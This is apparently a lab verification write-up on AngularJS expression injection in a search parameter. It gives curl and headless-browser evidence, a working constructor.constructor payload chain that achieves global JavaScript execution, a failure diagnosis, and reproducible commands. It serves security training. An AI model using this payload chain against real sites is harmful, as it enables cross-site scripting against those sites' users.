# Verification — AngularJS expression injection

## Methodology
1. Reflection mapping (curl): unique marker → locate echo (`<h1>`).
2. Per-character encoding map with `{{7*7}}"'<>` in ONE probe (expression delimiters
   + both quotes + brackets together).
3. Compiler proof (headless): `{{7*7}}` → `49` (expression evaluation, not yet code).
4. Code-execution proof (headless): constructor chain with global side effect
   (`document.title=`) INSIDE the generated string; assert title.
5. Failure diagnosis at the right privilege level (scope vs global).
6. Lab acceptance: real-browser `alert(1)` chain; banner polls.

## Evidence

### 1. Reflection (curl, `?search=reconprobe`)
```
<h1>0 search results for 'reconprobe'</h1>   (inside <body ng-app>)
```

### 2. Encoding map (curl, `?search=ENC{{7*7}}"'<>`)
```
<h1>0 search results for 'ENC{{7*7}}"&apos;&lt;&gt;'</h1>
```
`{{}}` raw, `"` RAW (title notwithstanding), `'`→`&apos;`, `<>`→entities.

### 3. Compiler proof (headless dump-dom)
```
?search=%7B%7B7%2A7%7D%7D  →  h1 shows: 0 search results for '49'
```
Angular evaluated the expression during bootstrap — sink confirmed live.

### 4. Code-execution proof (headless dump-dom)
```
?search=%7B%7Bconstructor.constructor(%22document.title%3D918273%22)()%7D%7D
→ <title>918273</title>
```
Chain: expression → `Object` → `Function` → global `document.title=` assignment.
Full global JS execution from inside `{{…}}`.

### 5. Failure diagnosis (the instructive one)
Attempt: `{{constructor.constructor(String.fromCharCode(…))()}}`
→ h1 rendered EMPTY, title unchanged — silent no-fire.
Cause: `String` is a window GLOBAL, invisible at expression scope (Level 1). The
payload died of identifier resolution, not sandboxing or filtering. Fix: put ALL
global references (including `String`, `document`, `alert`) INSIDE the generated
function's body string (Level 2), keeping Level 1 to `constructor` + one string.
Rule: attribute every expression failure to scope-level vs global-level before
changing anything else.

### 6. Lab acceptance
Real browser → `?search=%7B%7Bconstructor.constructor(%22alert(1)%22)()%7D%7D`
→ `alert(1)` on load → `is-solved` (first poll).

### 7. Dead-end analysis
| Candidate | Result | Why |
|---|---|---|
| Single-quote payload (`'…'`) | would arrive as `&apos;…&apos;` | Angular sees 6-char entity text, not a delimiter — strings impossible; `"` mandatory here |
| Markup payloads (`<script>`, `<img onerror>`) | `&lt;&gt;` inert | sink compiles expressions, doesn't parse markup — wrong family entirely |
| Direct globals in expression (`alert(1)`, `document.title=`) | undefined-identifier no-fire | Level-1 scope restriction (the fromCharCode lesson) |
| Sandbox-escape gadgets | unnecessary | no sandbox exists in 1.6+ (would be REQUIRED on 1.0–1.5 — version-gated, not universal) |

## Reproducibility
```
BASE=…
# map + compiler proof
curl -s "$BASE/?search=ENC%7B%7B7%2A7%7D%7D%22%27%3C%3E" | grep "search results for"
chromium --headless --no-sandbox --dump-dom "$BASE/?search=%7B%7B7%2A7%7D%7D" | grep -o "search results for[^<]*"
# code-execution proof (title side-effect inside generated string)
chromium --headless --no-sandbox --dump-dom "$BASE/?search=%7B%7Bconstructor.constructor(%22document.title%3D918273%22)()%7D%7D" | grep -o "<title>[^<]*</title>"
```

## Confirmation criteria
- CONFIRMED: encoding map (with title-correction on `"`), compiler evaluation
  (`49`), global code execution (title side-effect), real-browser acceptance.
- Diagnostic discipline demonstrated: scope-level vs global-level failure attribution.